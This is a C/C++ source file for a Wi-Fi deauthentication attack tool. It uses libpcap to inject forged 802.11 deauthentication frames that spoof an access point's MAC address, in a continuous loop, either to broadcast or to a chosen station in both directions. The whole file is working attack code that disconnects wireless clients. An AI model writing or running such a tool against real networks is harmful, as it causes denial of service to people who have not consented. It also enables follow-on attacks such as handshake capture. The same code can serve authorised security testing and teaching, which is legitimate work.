#include <stdio.h>
#include <stdbool.h>
#include <pcap.h>
#include <netinet/in.h>
#include <unistd.h>

#include "mac.h"
#include "IEEE802.11Hdr.h"
#include "radioTapHdr.h"

#define freq 100000 //micro second

#pragma pack(push, 1)
/*	//I guess wireless interface make this packet automatically
struct deauthPacket37{	//size is 37 bytes
	RadioTapHdr radioTapHdr;
	uint16_t txflags;
	uint8_t unknown;
	WifiHdr wifiHdr;
	uint16_t fixedParam;
};
#pragma pack(pop)
*/
#pragma pack(push, 1)
struct deauthPacket{	//size is 38 bytes
	RadioTapHdr radioTapHdr;
	uint8_t dataRate;
	uint8_t dummy;
	uint16_t txFlags;	
	WifiHdr wifiHdr;
	uint16_t fixedParam;
};
#pragma pack(pop)


void usage() {
	printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]\n");
	printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}


int main(int argc, char* argv[]) {
	if ( !(argc == 3 || argc == 4) ){
		usage();
		return -1;
	}
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "error: pcap_open_live(%s) return null - %s\n", dev, errbuf);
		return -1;
	}
	
	int seq = 0;
	
	if(argc==3){	//broadCast
		while (true) {
			deauthPacket packet;	//AP to stations
			memset(&packet, 0, sizeof(packet));
			
			packet.radioTapHdr.len = 12;
			packet.radioTapHdr.present = 0x00008004;
			
			packet.dataRate = 2;
			packet.txFlags = 0x0018;
			
			packet.wifiHdr.ver_type = WifiHdr::Deauthentication;
			packet.wifiHdr.duration = 314;
			packet.wifiHdr.addr[0] = Mac::broadcastMac();
			packet.wifiHdr.addr[1] = packet.wifiHdr.addr[2] = Mac(argv[2]);
			packet.wifiHdr.seq = seq<<4;
			
			packet.fixedParam = 0x0007;
			
			int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
			if (res != 0) {
				fprintf(stderr, "error: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
			}
			
			
			usleep(freq);
			seq++;
		}
	}
	else{	//uniCast
		while(true){
			deauthPacket packet;	//AP to Station
			memset(&packet, 0, sizeof(packet));
			
			packet.radioTapHdr.len = 12;
			packet.radioTapHdr.present = 0x00008004;
			
			packet.dataRate = 2;
			packet.txFlags = 0x0018;
			
			packet.wifiHdr.ver_type = WifiHdr::Deauthentication;
			packet.wifiHdr.duration = 314;
			packet.wifiHdr.addr[0] = Mac(argv[3]);
			packet.wifiHdr.addr[1] = packet.wifiHdr.addr[2] = Mac(argv[2]);
			packet.wifiHdr.seq = seq<<4;
			
			packet.fixedParam = 0x0007;
			
			int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
			if (res != 0) {
				fprintf(stderr, "error: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
			}
			
			
			packet.wifiHdr.addr[1] = Mac(argv[3]);	//station to AP
			packet.wifiHdr.addr[0] = packet.wifiHdr.addr[2] = Mac(argv[2]);
			packet.wifiHdr.seq = (seq+1)<<4;
			
			res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
			if (res != 0) {
				fprintf(stderr, "error: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
			}
			
			
			usleep(freq);
			seq+=2;
		}
	}
	
	pcap_close(pcap);
}
